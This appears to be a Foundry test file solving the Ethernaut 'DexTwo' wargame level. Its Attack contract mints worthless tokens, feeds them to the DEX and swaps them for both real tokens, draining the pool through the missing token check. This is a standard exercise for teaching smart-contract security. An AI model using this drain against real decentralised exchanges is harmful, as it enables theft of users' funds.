// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/23-DexTwo/DexTwoFactory.sol";
import "../src/Ethernaut.sol";

contract DexTwoTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testDexTwoHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DexTwoFactory factory = new DexTwoFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress, eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        DexTwo level = DexTwo(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        
        Attack hack = new Attack();
        hack.attack(levelAddress);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {

    function attack(address target) public {
        DexTwo dex = DexTwo(target);
        address t1 = dex.token1();
        address t2 = dex.token2();
        SwappableTokenTwo f1 = new SwappableTokenTwo(target, "f1", "F1", 2);
        SwappableTokenTwo f2 = new SwappableTokenTwo(target, "f2", "F2", 2);

        f1.approve(address(this), target, 1);
        f1.transfer(target, 1);
        f2.approve(address(this), target, 1);
        f2.transfer(target, 1);

        dex.swap(address(f1), t1, 1);
        dex.swap(address(f2), t2, 1);
    }
}